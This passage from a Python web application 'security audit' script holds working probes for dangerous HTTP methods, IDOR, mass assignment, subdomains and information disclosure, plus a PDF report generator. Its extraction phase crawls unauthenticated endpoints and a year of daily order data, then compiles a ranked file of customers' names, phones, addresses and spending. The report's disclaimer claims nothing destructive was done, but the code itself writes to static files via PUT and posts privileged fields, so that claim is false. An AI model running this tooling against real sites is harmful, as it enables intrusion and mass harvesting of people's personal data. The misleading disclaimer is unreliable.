            log.finding("HIGH", f"JWT contains sensitive claims: {sensitive_found}")
            findings.append({
                "title": "Sensitive Data in JWT Payload",
                "severity": "HIGH",
                "detail": f"The JWT payload contains sensitive fields: {', '.join(sensitive_found)}. JWTs are base64-encoded, not encrypted.",
                "evidence": f"Sensitive claims found: {sensitive_found}",
                "remediation": "Never store sensitive data (passwords, SSN, credit cards) in JWT payloads. Use opaque tokens or encrypt the payload (JWE).",
            })

    return findings


def test_http_methods(session, target, api_routes, found_paths):
    """Test for dangerous HTTP methods (TRACE, arbitrary PUT/DELETE)."""
    log.section("HTTP Method Testing")
    findings = []

    # TRACE test
    resp = safe_request(session, "TRACE", target)
    if resp and resp.status_code == 200 and "TRACE" in resp.text:
        log.finding("MEDIUM", "TRACE method enabled (cross-site tracing)")
        findings.append({
            "title": "TRACE Method Enabled",
            "severity": "MEDIUM",
            "detail": "The TRACE HTTP method is enabled, which can be exploited for cross-site tracing attacks.",
            "evidence": f"TRACE {target} returned {resp.status_code}",
            "remediation": "Disable the TRACE method in your web server configuration.",
        })

    # OPTIONS on key endpoints — check for unexpected methods
    for route in api_routes[:10]:
        url = urljoin(target, route)
        resp = safe_request(session, "OPTIONS", url)
        if resp is None:
            continue
        allow = resp.headers.get("Allow", "")
        if allow:
            dangerous = [m for m in ["PUT", "DELETE", "TRACE", "CONNECT"]
                         if m in allow.upper() and m not in ("GET", "POST", "OPTIONS", "HEAD")]
            if dangerous:
                log.finding("MEDIUM", f"Unexpected methods on {route}: {', '.join(dangerous)}")
                findings.append({
                    "title": f"Dangerous HTTP Methods Allowed on {route}",
                    "severity": "MEDIUM",
                    "detail": f"The endpoint {route} allows methods: {allow}. Dangerous: {', '.join(dangerous)}.",
                    "evidence": f"OPTIONS {route} -> Allow: {allow}",
                    "remediation": "Restrict allowed HTTP methods to only those needed. Disable TRACE and CONNECT server-wide.",
                })

    # PUT on static resources
    static_paths = [fp["path"] for fp in found_paths
                    if any(fp["path"].endswith(ext) for ext in [".txt", ".xml", ".json", ".html"])]
    for path in static_paths[:3]:
        url = urljoin(target, path)
        resp = safe_request(session, "PUT", url,
                            headers={"Content-Type": "text/plain"},
                            data="audit-test-content")
        if resp and resp.status_code in (200, 201, 204):
            log.finding("CRITICAL", f"PUT accepted on static resource {path}")
            findings.append({
                "title": f"Arbitrary File Write via PUT ({path})",
                "severity": "CRITICAL",
                "detail": f"PUT request accepted on {path} — attackers can overwrite files.",
                "evidence": f"PUT {path} -> {resp.status_code}",
                "remediation": "Disable PUT method on static file locations. Implement proper write authorization.",
            })

    if not findings:
        log.ok("No dangerous HTTP method issues found")
    return findings


def test_idor(session, target, data_endpoints, baseline_hash):
    """Test for Insecure Direct Object Reference (IDOR) vulnerabilities."""
    log.section("IDOR Testing")
    findings = []

    for ep in data_endpoints[:10]:
        route = ep["route"]
        data = ep["data"]

        # Find records with numeric IDs
        if isinstance(data, list) and data:
            record = data[0]
            id_fields = [k for k in record if k.lower() in ("id", "userid", "user_id",
                                                              "customerid", "customer_id", "uid")]
            for id_field in id_fields:
                original_id = record.get(id_field)
                if not isinstance(original_id, (int, float)):
                    try:
                        original_id = int(original_id)
                    except (ValueError, TypeError):
                        continue

                # Try accessing neighbor IDs
                for neighbor_id in [original_id + 1, original_id - 1]:
                    neighbor_url = urljoin(target, f"{route.rstrip('/')}/{neighbor_id}")
                    resp = safe_request(session, "GET", neighbor_url,
                                        headers={"Accept": "application/json"})
                    if resp is None or resp.status_code != 200:
                        continue
                    if is_same_content(resp, baseline_hash):
                        continue
                    try:
                        neighbor_data = resp.json()
                        if neighbor_data and neighbor_data != record:
                            log.finding("HIGH", f"IDOR on {route} (ID {original_id} -> {neighbor_id})")
                            findings.append({
                                "title": f"IDOR Vulnerability on {route}",
                                "severity": "HIGH",
                                "detail": f"Accessing {route}/{neighbor_id} returns different data than the original record (ID {original_id}), suggesting horizontal privilege escalation.",
                                "evidence": f"Original ID: {original_id}\nNeighbor ID: {neighbor_id}\nResponse: {json.dumps(neighbor_data)[:300]}",
                                "remediation": "Implement proper authorization checks. Verify that the authenticated user owns the requested resource before returning it.",
                            })
                            return findings
                    except (json.JSONDecodeError, ValueError):
                        continue

    if not findings:
        log.ok("No IDOR vulnerabilities detected")
    return findings


def test_mass_assignment(session, target, api_routes, writable_endpoints, baseline_hash):
    """Test for mass assignment / over-posting vulnerabilities."""
    log.section("Mass Assignment Testing")
    findings = []

    # Target writable endpoints that accepted POST/PATCH
    target_routes = set()
    for ep in writable_endpoints:
        target_routes.add(ep["route"].replace("/:id", ""))

    if not target_routes:
        # Fallback: try a few API routes with POST
        target_routes = set(r for r in api_routes[:10]
                            if any(k in r for k in ["user", "account", "profile", "register"]))

    for route in list(target_routes)[:5]:
        url = urljoin(target, route)
        resp = safe_request(session, "POST", url,
                            headers={"Content-Type": "application/json"},
                            json=MASS_ASSIGNMENT_FIELDS)
        if resp is None or resp.status_code in (401, 403, 404, 405):
            continue

        try:
            body = resp.json()
            body_str = json.dumps(body).lower()
        except (json.JSONDecodeError, ValueError):
            continue

        # Check if any privileged fields were accepted
        escalated = []
        for field in ["isadmin", "role", "is_superuser", "verified", "approved"]:
            if f'"{field}":true' in body_str or f'"{field}": true' in body_str or '"role":"admin"' in body_str:
                escalated.append(field)

        if escalated:
            log.finding("HIGH", f"Mass assignment on {route}: {escalated}")
            findings.append({
                "title": f"Mass Assignment / Privilege Escalation ({route})",
                "severity": "HIGH",
                "detail": f"The endpoint {route} accepted and processed privileged fields: {', '.join(escalated)}.",
                "evidence": f"Sent: {json.dumps(MASS_ASSIGNMENT_FIELDS)}\nAccepted fields: {escalated}\nResponse: {json.dumps(body)[:300]}",
                "remediation": "Use a whitelist of allowed fields for each endpoint. Never bind request bodies directly to models. Explicitly define which fields are writable.",
            })

    if not findings:
        log.ok("No mass assignment vulnerabilities detected")
    return findings


# ---------------------------------------------------------------------------
# Phase 3C: Subdomain Enumeration
# ---------------------------------------------------------------------------

def _resolve_subdomain(domain, prefix):
    """Resolve a single subdomain. Returns (subdomain, ip) or None."""
    subdomain = f"{prefix}.{domain}"
    try:
        results = socket.getaddrinfo(subdomain, None, socket.AF_INET)
        ip = results[0][4][0] if results else None
        return (subdomain, ip)
    except socket.gaierror:
        return None


def enumerate_subdomains(session, target):
    """Enumerate common subdomains via DNS resolution."""
    log.section("Subdomain Enumeration")
    findings = []
    parsed = urlparse(target)
    domain = parsed.hostname

    # Don't enumerate subdomains of IPs
    try:
        socket.inet_aton(domain)
        log.info("Target is an IP address, skipping subdomain enumeration")
        return findings
    except socket.error:
        pass

    discovered = []
    counter = [0]
    lock = threading.Lock()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(_resolve_subdomain, domain, prefix): prefix
                   for prefix in COMMON_SUBDOMAINS}
        for future in as_completed(futures):
            result = future.result()
            with lock:
                counter[0] += 1
                log.progress(counter[0], len(COMMON_SUBDOMAINS), "Resolving subdomains")
                if result:
                    subdomain, ip = result
                    discovered.append({"subdomain": subdomain, "ip": ip})
                    log.finding("INFO", f"Subdomain found: {subdomain} -> {ip}")

    if discovered:
        # Check for staging/dev/admin subdomains
        sensitive = [d for d in discovered
                     if any(s in d["subdomain"] for s in ["staging", "dev", "test", "admin", "internal"])]

        evidence = "\n".join(f"{d['subdomain']} -> {d['ip']}" for d in discovered)
        findings.append({
            "title": f"Discovered {len(discovered)} Subdomains",
            "severity": "MEDIUM" if sensitive else "INFO",
            "detail": (f"{len(discovered)} subdomains resolved for {domain}. "
                       + (f"{len(sensitive)} appear to be development/staging environments." if sensitive else "")),
            "evidence": evidence[:800],
            "remediation": "Ensure staging/dev subdomains are not publicly accessible or contain test credentials. Apply the same security controls as production.",
        })
    else:
        log.ok("No additional subdomains discovered")

    return findings


# ---------------------------------------------------------------------------
# Phase 4: Additional checks
# ---------------------------------------------------------------------------

def check_info_disclosure(session, target, api_routes, resp_headers):
    """Check for information disclosure vulnerabilities."""
    log.section("Information Disclosure Checks")
    findings = []

    # 1. Debug mode detection
    for param in ["debug=true", "debug=1", "_debug=1"]:
        url = f"{target}?{param}"
        resp = safe_request(session, "GET", url)
        if resp is None:
            continue
        body = resp.text.lower()
        debug_sigs = ["traceback", "installed_apps", "secret_key", "settings",
                      "at module._compile", "at object.<anonymous>",
                      "whoops!", "app_key", "laravel", "stack trace"]
        for sig in debug_sigs:
            if sig in body:
                log.finding("HIGH", f"Debug mode active ({param})")
                findings.append({
                    "title": "Debug Mode Enabled",
                    "severity": "HIGH",
                    "detail": f"Debug mode appears to be active when requesting with ?{param}.",
                    "evidence": f"Debug signature: '{sig}' found in response to ?{param}",
                    "remediation": "Disable debug mode in production. Set DEBUG=False (Django), NODE_ENV=production (Express), APP_DEBUG=false (Laravel).",
                })
                break
        if findings:
            break

    # 2. Error disclosure via malformed requests
    error_tests = [
        (target + "/api/__nonexistent_audit_path__/", "GET"),
        (target, "PATCH"),
    ]
    for url, method in error_tests:
        resp = safe_request(session, method, url,
                            headers={"Content-Type": "application/json"},
                            data="not-valid-json")
        if resp is None:
            continue
        body = resp.text
        # Check for stack traces / file paths
        path_patterns = [
            r'/(?:app|var/www|home|srv|opt)/[^\s<"\']+\.\w+',
            r'at\s+\S+\s+\([^)]*:\d+:\d+\)',
            r'File\s+"[^"]+",\s+line\s+\d+',
        ]
        for pattern in path_patterns:
            match = re.search(pattern, body)
            if match:
                log.finding("MEDIUM", f"Stack trace / file path in error response")
                findings.append({
                    "title": "Stack Trace Disclosure in Error Response",
                    "severity": "MEDIUM",
                    "detail": "Error responses contain internal file paths or stack traces.",
                    "evidence": f"Pattern: {match.group(0)[:200]}",
                    "remediation": "Return generic error messages in production. Log detailed errors server-side only.",
                })
                break

    # 3. Internal IP leakage
    ip_pattern = re.compile(
        r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
        r'172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|'
        r'192\.168\.\d{1,3}\.\d{1,3})'
    )
    # Check response headers
    internal_headers = ["X-Backend-Server", "X-Server-IP", "X-Forwarded-Server", "Via"]
    for h in internal_headers:
        val = resp_headers.get(h, "")
        if ip_pattern.search(val):
            log.finding("MEDIUM", f"Internal IP in header {h}: {val}")
            findings.append({
                "title": f"Internal IP Address Leaked in {h} Header",
                "severity": "MEDIUM",
                "detail": f"The response header {h} contains an internal IP address.",
                "evidence": f"{h}: {val}",
                "remediation": "Strip internal infrastructure headers from responses sent to clients.",
            })

    # Check a few API response bodies for internal IPs
    for route in api_routes[:5]:
        url = urljoin(target, route)
        resp = safe_request(session, "GET", url)
        if resp and resp.status_code == 200:
            for match in ip_pattern.finditer(resp.text[:2000]):
                log.finding("LOW", f"Internal IP in response body of {route}: {match.group()}")
                findings.append({
                    "title": f"Internal IP Address in API Response ({route})",
                    "severity": "LOW",
                    "detail": f"API response from {route} contains internal IP address {match.group()}.",
                    "evidence": f"IP: {match.group()} in response from {route}",
                    "remediation": "Avoid exposing internal infrastructure details in API responses.",
                })
                break

    if not findings:
        log.ok("No information disclosure issues found")
    return findings


# ---------------------------------------------------------------------------
# Phase 5: Data extraction (optional)
# ---------------------------------------------------------------------------

def _paginate_endpoint(session, target, route, initial_data):
    """Attempt to fetch additional pages from a list endpoint. Returns all records."""
    if not isinstance(initial_data, list) or len(initial_data) == 0:
        return initial_data

    all_records = list(initial_data)
    page_size = len(initial_data)
    url = urljoin(target, route)
    MAX_PAGES = 10
    MAX_RECORDS = 5000

    # Try ?page= pagination first
    for page in range(2, MAX_PAGES + 1):
        resp = safe_request(session, "GET", f"{url}?page={page}",
                            headers={"Accept": "application/json"})
        if resp is None or resp.status_code != 200:
            break
        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            break
        if not isinstance(data, list) or len(data) == 0:
            break
        # Stop if we're getting duplicates (same first record)
        if data[0] == initial_data[0]:
            break
        all_records.extend(data)
        log.info(f"  Paginated {route}?page={page}: +{len(data)} records")
        if len(all_records) >= MAX_RECORDS:
            log.warn(f"  Pagination capped at {MAX_RECORDS} records for {route}")
            break
        if len(data) < page_size:
            break  # Last page (partial)

    # If page= didn't yield extra records, try ?offset= pagination
    if len(all_records) == len(initial_data):
        offset = page_size
        for _ in range(MAX_PAGES - 1):
            resp = safe_request(session, "GET", f"{url}?offset={offset}&limit={page_size}",
                                headers={"Accept": "application/json"})
            if resp is None or resp.status_code != 200:
                break
            try:
                data = resp.json()
            except (json.JSONDecodeError, ValueError):
                break
            if not isinstance(data, list) or len(data) == 0:
                break
            all_records.extend(data)
            log.info(f"  Paginated {route}?offset={offset}: +{len(data)} records")
            offset += page_size
            if len(all_records) >= MAX_RECORDS or len(data) < page_size:
                break

    return all_records


def extract_data(session, target, data_endpoints, output_dir):
    """Extract all accessible data to CSV files for breach scope assessment."""
    log.section("Data Extraction (Breach Scope Assessment)")
    os.makedirs(output_dir, exist_ok=True)
    extraction_stats = []

    for ep in data_endpoints:
        route = ep["route"]
        data = ep["data"]
        if not data:
            continue

        # Attempt pagination for list endpoints
        if isinstance(data, list) and data:
            data = _paginate_endpoint(session, target, route, data)

        # Generate a filename from the route
        filename = route.strip("/").replace("/", "_").replace(":", "") + ".csv"
        filepath = os.path.join(output_dir, filename)

        if isinstance(data, list) and data:
            # Flatten nested JSON
            fieldnames = list(data[0].keys())
            with open(filepath, "w", newline="", encoding="utf-8") as f:
                w = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
                w.writeheader()
                w.writerows(data)
            log.info(f"Extracted {len(data)} records -> {filename}")
            extraction_stats.append({"file": filename, "records": len(data), "route": route})

        elif isinstance(data, dict):
            with open(filepath, "w", newline="", encoding="utf-8") as f:
                w = csv.DictWriter(f, fieldnames=data.keys())
                w.writeheader()
                w.writerow(data)
            log.info(f"Extracted 1 record -> {filename}")
            extraction_stats.append({"file": filename, "records": 1, "route": route})

    # Try to find and extract date-parameterized endpoints (orders/daily pattern)
    date_endpoints = [ep for ep in data_endpoints
                      if any(x in ep["route"] for x in ["daily", "monthly", "yearly"])]

    for ep in date_endpoints:
        route = ep["route"]
        if "daily" in route:
            log.info(f"Extracting date-ranged data from {route}...")
            all_records = []
            today = datetime.now().date()
            # Go back 365 days
            start = today - timedelta(days=365)
            current = start
            days_checked = 0
            total_days = (today - start).days + 1

            while current <= today:
                ds = current.strftime("%Y-%m-%d")
                url = urljoin(target, f"{route}?date={ds}")
                resp = safe_request(session, "GET", url, headers={"Accept": "application/json"})
                if resp and resp.status_code == 200:
                    try:
                        d = resp.json()
                        orders = d.get("orders", []) if isinstance(d, dict) else (d if isinstance(d, list) else [])
                        if orders:
                            all_records.extend(orders)
                    except (json.JSONDecodeError, ValueError):
                        pass
                current += timedelta(days=1)
                days_checked += 1
                log.progress(days_checked, total_days, f"Extracting {route}")

            if all_records:
                filename = route.strip("/").replace("/", "_") + "_full_extract.csv"
                filepath = os.path.join(output_dir, filename)
                fieldnames = list(all_records[0].keys())
                with open(filepath, "w", newline="", encoding="utf-8") as f:
                    w = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
                    w.writeheader()
                    w.writerows(all_records)
                log.info(f"Extracted {len(all_records)} total records -> {filename}")
                extraction_stats.append({
                    "file": filename, "records": len(all_records), "route": route + " (date-ranged)"
                })

                # Build enriched customer view if orders have customer data
                if any("phone" in k.lower() or "customer" in k.lower() for k in all_records[0].keys()):
                    phone_key = next((k for k in all_records[0] if "phone" in k.lower()), None)
                    name_key = next((k for k in all_records[0] if "name" in k.lower()
                                     and "product" not in k.lower()), None)
                    addr_key = next((k for k in all_records[0] if "address" in k.lower()), None)
                    total_key = next((k for k in all_records[0] if k.lower() == "total"), None)
                    date_key = next((k for k in all_records[0] if "date" in k.lower()
                                     and "create" not in k.lower()), None)

                    if phone_key:
                        customers = {}
                        for o in all_records:
                            phone = o.get(phone_key, "")
                            if not phone:
                                continue
                            if phone not in customers:
                                customers[phone] = {
                                    "name": o.get(name_key, "") if name_key else "",
                                    "phone": phone,
                                    "addresses": set(),
                                    "order_count": 0,
                                    "total_spent": 0.0,
                                    "first_order": "",
                                    "last_order": "",
                                }
                            c = customers[phone]
                            c["order_count"] += 1
                            try:
                                c["total_spent"] += float(o.get(total_key, 0) or 0)
                            except (ValueError, TypeError):
                                pass
                            if addr_key and o.get(addr_key):
                                c["addresses"].add(str(o[addr_key]))
                            od = str(o.get(date_key, "")) if date_key else ""
                            if od and (not c["last_order"] or od > c["last_order"]):
                                c["last_order"] = od
                            if od and (not c["first_order"] or od < c["first_order"]):
                                c["first_order"] = od

                        cust_file = os.path.join(output_dir, "customers_enriched.csv")
                        with open(cust_file, "w", newline="", encoding="utf-8") as f:
                            w = csv.writer(f)
                            w.writerow(["name", "phone", "order_count", "total_spent",
                                        "first_order", "last_order", "delivery_addresses"])
                            for phone, c in sorted(customers.items(), key=lambda x: -x[1]["total_spent"]):
                                w.writerow([
                                    c["name"], c["phone"], c["order_count"],
                                    f"{c['total_spent']:.2f}", c["first_order"], c["last_order"],
                                    " | ".join(c["addresses"]) if c["addresses"] else ""
                                ])
                        log.info(f"Built enriched customer view: {len(customers)} customers -> customers_enriched.csv")
                        extraction_stats.append({
                            "file": "customers_enriched.csv",
                            "records": len(customers),
                            "route": "enriched from orders"
                        })

    return extraction_stats


# ---------------------------------------------------------------------------
# Phase 6: Report generation
# ---------------------------------------------------------------------------

class AuditPDF(FPDF):
    def __init__(self, target_url):
        super().__init__()
        self.target_url = target_url

    def header(self):
        self.set_font("Helvetica", "B", 9)
        self.set_text_color(100, 100, 100)
        self.cell(0, 7, "CONFIDENTIAL - Security Assessment Report", align="C",
                  new_x="LMARGIN", new_y="NEXT")
        self.line(10, self.get_y(), 200, self.get_y())
        self.ln(2)

    def footer(self):
        self.set_y(-15)
        self.set_font("Helvetica", "I", 8)
        self.set_text_color(128, 128, 128)
        self.cell(0, 10, f"Page {self.page_no()}/{{nb}}", align="C")

    def title_page(self, finding_counts):
        self.ln(30)
        self.set_font("Helvetica", "B", 26)
        self.set_text_color(20, 20, 80)
        self.cell(0, 14, "Security Assessment Report", align="C", new_x="LMARGIN", new_y="NEXT")
        self.ln(5)
        self.set_font("Helvetica", "", 14)
        self.set_text_color(80, 80, 80)
        self.cell(0, 10, self.target_url, align="C", new_x="LMARGIN", new_y="NEXT")
        self.ln(8)
        self.set_font("Helvetica", "", 11)
        self.cell(0, 7, f"Date: {datetime.now().strftime('%B %d, %Y')}", align="C",
                  new_x="LMARGIN", new_y="NEXT")
        self.cell(0, 7, "Classification: CONFIDENTIAL", align="C",
                  new_x="LMARGIN", new_y="NEXT")
        self.cell(0, 7, "Assessment Type: External Black-Box Web Application Audit",
                  align="C", new_x="LMARGIN", new_y="NEXT")
        self.ln(15)

        # Overall severity
        max_sev = "INFO"
        for s in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            if finding_counts.get(s, 0) > 0:
                max_sev = s
                break
        sev_colors = {"CRITICAL": (180, 0, 0), "HIGH": (220, 80, 0),
                      "MEDIUM": (200, 160, 0), "LOW": (0, 120, 180), "INFO": (100, 100, 100)}
        r, g, b = sev_colors.get(max_sev, (100, 100, 100))
        self.set_draw_color(r, g, b)
        self.set_line_width(0.5)
        self.rect(30, self.get_y(), 150, 25)
        self.set_font("Helvetica", "B", 14)
        self.set_text_color(r, g, b)
        self.cell(0, 12, f"OVERALL RISK RATING: {max_sev}", align="C",
                  new_x="LMARGIN", new_y="NEXT")
        self.set_font("Helvetica", "", 10)
        counts_str = "  |  ".join(f"{s}: {finding_counts.get(s, 0)}"
                                   for s in ["CRITICAL", "HIGH", "MEDIUM", "LOW"])
        self.cell(0, 10, counts_str, align="C", new_x="LMARGIN", new_y="NEXT")

    def h1(self, text):
        self.set_font("Helvetica", "B", 15)
        self.set_text_color(20, 20, 80)
        self.ln(4)
        self.cell(0, 10, text, new_x="LMARGIN", new_y="NEXT")
        self.line(10, self.get_y(), 200, self.get_y())
        self.ln(2)

    def h2(self, text):
        self.set_font("Helvetica", "B", 12)
        self.set_text_color(40, 40, 100)
        self.ln(3)
        self.cell(0, 8, text, new_x="LMARGIN", new_y="NEXT")
        self.ln(1)

    def body(self, text):
        self.set_font("Helvetica", "", 10)
        self.set_text_color(30, 30, 30)
        self.multi_cell(0, 5.5, text, new_x="LMARGIN", new_y="NEXT")
        self.ln(2)

    def bold(self, text):
        self.set_font("Helvetica", "B", 10)
        self.set_text_color(30, 30, 30)
        self.multi_cell(0, 5.5, text, new_x="LMARGIN", new_y="NEXT")

    def code(self, text):
        self.set_font("Courier", "", 8)
        self.set_fill_color(240, 240, 240)
        self.set_text_color(30, 30, 30)
        self.multi_cell(0, 4.5, text, fill=True, new_x="LMARGIN", new_y="NEXT")
        self.ln(2)

    def bullet(self, text):
        self.set_font("Helvetica", "", 10)
        self.set_text_color(30, 30, 30)
        self.multi_cell(0, 5.5, "  - " + text, new_x="LMARGIN", new_y="NEXT")

    def severity_tag(self, severity):
        colors = {"CRITICAL": (180, 0, 0), "HIGH": (220, 80, 0),
                  "MEDIUM": (200, 160, 0), "LOW": (0, 120, 180), "INFO": (100, 100, 100)}
        r, g, b = colors.get(severity, (100, 100, 100))
        self.set_fill_color(r, g, b)
        self.set_text_color(255, 255, 255)
        self.set_font("Helvetica", "B", 9)
        w = self.get_string_width(f"  {severity}  ") + 4
        self.cell(w, 7, f"  {severity}  ", fill=True, new_x="LMARGIN", new_y="NEXT")
        self.ln(2)
        self.set_text_color(30, 30, 30)


def generate_report(target, all_findings, tech_info, accessible_endpoints,
                    writable_endpoints, extraction_stats, output_path):
    """Generate the PDF security assessment report."""
    log.section("Generating PDF Report")

    pdf = AuditPDF(target)
    pdf.alias_nb_pages()
    pdf.set_auto_page_break(auto=True, margin=20)

    # Count findings by severity
    counts = {}
    for f in all_findings:
        s = f["severity"]
        counts[s] = counts.get(s, 0) + 1

    # Title page
    pdf.add_page()
    pdf.title_page(counts)

    # Table of contents / summary
    pdf.add_page()
    pdf.h1("1. Executive Summary")
    pdf.body(
        f"A security assessment was conducted against {target} on "
        f"{datetime.now().strftime('%B %d, %Y')}. The assessment identified "
        f"{len(all_findings)} findings: {counts.get('CRITICAL', 0)} Critical, "
        f"{counts.get('HIGH', 0)} High, {counts.get('MEDIUM', 0)} Medium, "
        f"{counts.get('LOW', 0)} Low severity issues."
    )

    if tech_info:
        pdf.h2("Technology Stack")
        for k, v in tech_info.items():
            if not k.startswith("secret_"):
                pdf.bullet(f"{k}: {v}")

    # Findings summary table
    pdf.h2("Findings Summary")
    pdf.set_font("Helvetica", "B", 9)
    pdf.set_fill_color(20, 20, 80)
    pdf.set_text_color(255, 255, 255)
    pdf.cell(10, 7, "#", border=1, fill=True, align="C")
    pdf.cell(100, 7, "Finding", border=1, fill=True)
    pdf.cell(25, 7, "Severity", border=1, fill=True, align="C")
    pdf.cell(45, 7, "Category", border=1, fill=True, align="C", new_x="LMARGIN", new_y="NEXT")

    pdf.set_font("Helvetica", "", 8)
    pdf.set_text_color(30, 30, 30)
    sev_colors = {"CRITICAL": (180, 0, 0), "HIGH": (220, 80, 0),
                  "MEDIUM": (200, 160, 0), "LOW": (0, 120, 180)}
    for i, f in enumerate(all_findings):
        if i % 2 == 0:
            pdf.set_fill_color(245, 245, 250)
        else:
            pdf.set_fill_color(255, 255, 255)
        pdf.set_text_color(30, 30, 30)
        pdf.set_font("Helvetica", "", 8)
        pdf.cell(10, 6, str(i + 1), border=1, fill=True, align="C")
        title = f["title"][:55] + "..." if len(f["title"]) > 55 else f["title"]
        pdf.cell(100, 6, title, border=1, fill=True)
        r, g, b = sev_colors.get(f["severity"], (100, 100, 100))
        pdf.set_text_color(r, g, b)
        pdf.set_font("Helvetica", "B", 8)
        pdf.cell(25, 6, f["severity"], border=1, fill=True, align="C")
        pdf.set_text_color(30, 30, 30)
        pdf.set_font("Helvetica", "", 8)
        cat = f.get("category", "Security")
        pdf.cell(45, 6, cat, border=1, fill=True, align="C", new_x="LMARGIN", new_y="NEXT")

    # Detailed findings
    pdf.add_page()
    pdf.h1("2. Detailed Findings")

    for i, f in enumerate(all_findings):
        pdf.h2(f"2.{i + 1} {f['title']}")
        pdf.severity_tag(f["severity"])
        pdf.body(f["detail"])
        if f.get("evidence"):
            pdf.bold("Evidence:")
            pdf.ln(1)
            evidence = f["evidence"]
            if len(evidence) > 800:
                evidence = evidence[:800] + "\n... (truncated)"
            pdf.code(evidence)
        if f.get("remediation"):
            pdf.bold("Remediation:")
            pdf.body(f["remediation"])

    # Data exposure section
    if accessible_endpoints:
        pdf.add_page()
        pdf.h1("3. Data Exposure Summary")
        total_records = sum(e.get("record_count", 0) or 0 for e in accessible_endpoints)
        pii_eps = [e for e in accessible_endpoints if e.get("has_pii")]
        pdf.body(
            f"{len(accessible_endpoints)} API endpoints returned data without authentication, "
            f"exposing approximately {total_records} total records. "
            f"{len(pii_eps)} endpoints contained personally identifiable information (PII)."
        )
        for e in accessible_endpoints:
            pdf.bullet(f"{e['method']} {e['route']} - {e.get('record_count', 'N/A')} records "
                       f"({e['size']} bytes)" + (" [CONTAINS PII]" if e.get('has_pii') else ""))

    if writable_endpoints:
        pdf.h2("Writable Endpoints (No Auth)")
        for e in writable_endpoints:
            pdf.bullet(f"{e['method']} {e['route']} -> HTTP {e['status']}")

    # Extraction stats
    if extraction_stats:
        pdf.add_page()
        pdf.h1("4. Extracted Data Inventory")
        pdf.body("The following data was extracted during the breach scope assessment:")
        pdf.set_font("Helvetica", "B", 9)
        pdf.set_fill_color(20, 20, 80)
        pdf.set_text_color(255, 255, 255)
        pdf.cell(70, 7, "File", border=1, fill=True)
        pdf.cell(30, 7, "Records", border=1, fill=True, align="C")
        pdf.cell(80, 7, "Source", border=1, fill=True, new_x="LMARGIN", new_y="NEXT")
        pdf.set_font("Helvetica", "", 9)
        pdf.set_text_color(30, 30, 30)
        for es in extraction_stats:
            pdf.set_fill_color(250, 250, 250)
            pdf.cell(70, 6, es["file"][:40], border=1, fill=True)
            pdf.cell(30, 6, str(es["records"]), border=1, fill=True, align="C")
            pdf.cell(80, 6, es["route"][:45], border=1, fill=True, new_x="LMARGIN", new_y="NEXT")

    # Remediation
    pdf.add_page()
    section_num = 5 if extraction_stats else 4
    pdf.h1(f"{section_num}. Remediation Recommendations")

    remediation = [
        ("IMMEDIATE (24 hours)", [
            "Add authentication middleware to ALL API endpoints",
            "Rotate any exposed credentials (API keys, S3 keys, tokens)",
            "Disable unauthenticated write/delete endpoints immediately",
            "Change any exposed passwords, discount codes, or secrets",
        ]),
        ("SHORT-TERM (1 week)", [
            "Implement proper session-based or JWT authentication",
            "Add security headers (use helmet for Express, or equivalent)",
            "Remove technology disclosure headers (X-Powered-By, Server)",
            "Implement rate limiting on all endpoints",
            "Configure strict CORS policy",
        ]),
        ("MEDIUM-TERM (1 month)", [
            "Implement role-based access control (RBAC)",
            "Encrypt PII at rest (names, phones, addresses)",
            "Add API response filtering (don't expose internal fields)",
            "Implement access logging and anomaly detection",
            "Conduct legal review for breach notification requirements",
            "Schedule follow-up security assessment",
        ]),
    ]

    for timeframe, items in remediation:
        pdf.h2(timeframe)
        for item in items:
            pdf.bullet(item)

    # Footer
    pdf.add_page()
    pdf.h1(f"{section_num + 1}. Disclaimer")
    pdf.body(
        f"This report was generated on {datetime.now().strftime('%B %d, %Y at %H:%M:%S')}. "
        "Assessment conducted via external black-box methodology. "
        "No destructive actions were performed during testing. "
        "Write-endpoint tests used empty/non-existent IDs to avoid data modification. "
        "This report is confidential and intended solely for the client."
    )

    pdf.output(output_path)
    log.info(f"Report saved: {output_path}")


# ---------------------------------------------------------------------------
# Main orchestrator
# ---------------------------------------------------------------------------

def run_audit(target, extract=False, output_dir=None, auth=None,
              skip_injection=False, skip_subdomains=False, skip_dns=False):
    """Run the complete security audit pipeline.

    auth: optional dict with keys bearer_token, cookie, api_key, api_key_header
    """
    parsed = urlparse(target)
    if not parsed.scheme:
        target = "https://" + target
        parsed = urlparse(target)

    domain = parsed.hostname
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    if output_dir is None:
        output_dir = os.path.join(os.path.expanduser("~"), "Desktop",
                                  f"audit_{domain}_{timestamp}")
    os.makedirs(output_dir, exist_ok=True)

    log.banner(f"Security Audit: {target}")
    log.info(f"Output directory: {output_dir}")
    log.info(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    auth = auth or {}
    session = make_session(
        target,
        bearer_token=auth.get("bearer_token"),
        cookie=auth.get("cookie"),
        api_key=auth.get("api_key"),
        api_key_header=auth.get("api_key_header", "X-API-Key"),
    )
    if auth:
        log.info(f"Auth credentials provided: {', '.join(auth.keys())}")

    all_findings = []

    # Get baseline response hash (for SPA catch-all detection)
    baseline_resp = safe_request(session, "GET", target)
    baseline_hash = hash(baseline_resp.content) if baseline_resp else None

    # ── Phase 1: Reconnaissance ──────────────────────────────────────────
    log.banner("Phase 1: Reconnaissance")
    header_findings, resp_headers = recon_headers(session, target)
    all_findings.extend(header_findings)

    tls_findings = recon_tls(target)
    all_findings.extend(tls_findings)

    cors_findings = recon_cors(session, target)
    all_findings.extend(cors_findings)

    waf_findings = detect_waf(session, target)
    all_findings.extend(waf_findings)

    if not skip_dns:
        dns_findings = recon_dns(target)
        all_findings.extend(dns_findings)

    # ── Phase 2: Endpoint Discovery ──────────────────────────────────────
    log.banner("Phase 2: Endpoint Discovery")
    path_findings = discover_paths(session, target, baseline_hash)
    api_routes, external_urls, tech_info, js_urls = discover_js_endpoints(session, target)

    # Parse OpenAPI/Swagger specs for additional routes
    spec_routes = parse_openapi_spec(session, target, path_findings)
    api_routes = list(set(api_routes + spec_routes))

    # Parse robots.txt / sitemap.xml for additional paths
